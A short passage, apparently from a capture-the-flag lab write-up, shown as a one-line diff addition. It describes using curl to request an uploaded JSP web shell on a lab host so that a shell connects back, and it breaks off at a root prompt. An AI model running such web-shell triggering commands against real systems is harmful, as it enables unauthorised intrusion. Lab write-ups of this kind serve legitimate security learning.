@@ -1,0 +1,1 @@
+the uploaded shell: Execute Shell I can visit that url with curl : root@kali# curl 'http://10.10.10.11:8500/userfiles/file/df.jsp' And in another window (about 30 seconds later) I get a shell: root@kali#
